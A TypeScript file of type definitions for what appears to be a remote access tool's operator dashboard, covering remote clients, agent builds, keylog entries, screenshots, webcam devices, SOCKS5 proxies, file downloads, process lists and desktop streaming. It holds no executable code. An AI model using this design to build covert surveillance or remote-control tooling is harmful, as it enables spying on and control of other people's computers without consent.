export interface User {
  id: number;
  username: string;
  role: "admin" | "operator" | "viewer";
  canUploadFiles?: boolean;
  canBuild?: boolean;
  featurePermissions?: Record<string, boolean>;
}

export interface LoginPayload {
  user: string;
  pass: string;
}

export interface LoginResponse {
  ok: boolean;
  user?: User;
  error?: string;
}

export interface Client {
  id: string;
  host: string;
  user: string;
  os: string;
  arch?: string;
  country?: string;
  online: boolean;
  lastSeen: number;
  pingMs?: number;
  cpu?: string;
  gpu?: string;
  ram?: string;
  monitors?: number;
  version?: string;
  webcamAvailable?: boolean;
  webcamDevices?: unknown[];
  batteryPercent?: string;
  batteryCharging?: boolean;
  bookmarked?: boolean;
  notificationsMuted?: boolean;
  ip?: string;
  hwid?: string;
  nickname?: string;
  customTag?: string;
  customTagNote?: string;
  elevation?: string;
  isAdmin?: boolean;
  groupId?: string;
  groupName?: string;
  groupColor?: string;
  hasThumbnail?: boolean;
  thumbnailVersion?: number;
  role?: string;
  buildTag?: string;
  builtByUserId?: number;
  enrollmentStatus?: string;
  publicKey?: string;
  keyFingerprint?: string;
  permissions?: string;
  pluginMeta?: string;
  disconnectReason?: string;
  disconnectDetail?: string;
  denyReason?: string;
  suspiciousFlags?: unknown[];
}

export interface PaginatedClients {
  items: Client[];
  total: number;
  page: number;
  pageSize: number;
  online: number;
}

export interface HardwareOptions {
  cpu: string[];
  gpu: string[];
}

export interface DashboardEvent {
  type: "client_event" | "clients_changed";
  event?: "client_online" | "client_offline" | "client_update" | "clients_changed";
  clientId?: string;
  client?: Client;
}

export interface Group {
  id: string;
  name: string;
  color?: string;
}

export interface BuildProfile {
  id: string;
  name: string;
  config: Record<string, unknown>;
}

export interface Build {
  id: string;
  tag?: string;
  platform: string;
  arch?: string;
  status: "pending" | "building" | "completed" | "failed" | "blocked";
  output?: string;
  createdAt: number;
  completedAt?: number;
  userId?: number;
}

export interface SavedScript {
  id: number;
  name: string;
  content: string;
  createdAt: number;
  updatedAt: number;
}

export interface Notification {
  id: number;
  category?: string;
  type?: string;
  title: string;
  body?: string;
  clientId?: string;
  hostname?: string;
  read?: boolean;
  ts?: number;
  createdAt?: number;
  screenshotPath?: string;
}

export interface LogEntry {
  id: number;
  userId: number;
  username: string;
  action: string;
  detail: string;
  ip: string;
  createdAt: number;
}

export interface Plugin {
  id: string;
  name: string;
  version: string;
  enabled: boolean;
  description?: string;
  hasServer?: boolean;
  manifest?: Record<string, unknown>;
}

export interface ProcessInfo {
  pid: number;
  ppid?: number;
  name: string;
  exePath?: string;
  cpu: number;
  memory: number;
  username?: string;
  type?: string;
}

export interface KeylogEntry {
  id: number;
  clientId: string;
  filename: string;
  size?: number;
  createdAt?: number;
}

export interface ScreenshotEntry {
  id: number;
  clientId: string;
  hostname?: string;
  thumbnailPath?: string;
  path?: string;
  createdAt: number;
}

export interface EnrollmentAgent {
  id: string;
  hostname: string;
  username?: string;
  os?: string;
  ip?: string;
  hwid?: string;
  buildTag?: string;
  createdAt: number;
  status?: string;
}

export interface Socks5Proxy {
  id: string;
  clientId: string;
  hostname?: string;
  port: number;
  status: "running" | "stopped";
  startedAt?: number;
}

export interface UserClientAccessRule {
  id?: number;
  clientId: string;
  hostname?: string;
  type: "allow" | "deny";
}

export interface FileEntry {
  name: string;
  path: string;
  isDir: boolean;
  size: number;
  modTime: number;
  mode?: string;
  owner?: string;
  freeBytes?: number;
  totalBytes?: number;
  fsType?: string;
}

export interface WsReadyMessage {
  type: "ready";
  sessionId: string;
  clientId: string;
  clientOnline: boolean;
}

export interface WsStatusMessage {
  type: "status";
  status: "online" | "offline" | "starting" | "stopped" | "connecting" | "closed" | "error";
}

export interface WsFrameMessage {
  type: "frame";
}

export interface WsConsoleOutput {
  type: "console_output";
  sessionId: string;
  data: string;
  exitCode?: number;
}

export interface WsFileListResult {
  type: "file_list_result";
  commandId: string;
  path: string;
  entries: FileEntry[];
  accessDenied?: boolean;
}

export interface WsFileDownload {
  type: "file_download";
  commandId: string;
  path: string;
  data: Uint8Array;
  offset: number;
  total: number;
  chunkIndex?: number;
  chunksTotal?: number;
}

export interface WsProcessListResult {
  type: "process_list_result";
  commandId: string;
  processes: ProcessInfo[];
}

export interface WsCommandResult {
  type: "command_result";
  commandId: string;
  ok: boolean;
  message?: string;
}

export interface WsDesktopStreamStats {
  type: "desktop_stream_stats";
  fps: number;
  format: string;
  bytes: number;
  width: number;
  height: number;
  captureMs?: number;
  encodeMs?: number;
  sendMs?: number;
  totalMs?: number;
  transport?: string;
}

export type WsMessage =
  | WsReadyMessage
  | WsStatusMessage
  | WsConsoleOutput
  | WsFileListResult
  | WsFileDownload
  | WsProcessListResult
  | WsCommandResult
  | WsDesktopStreamStats
  | { type: string; [key: string]: unknown };
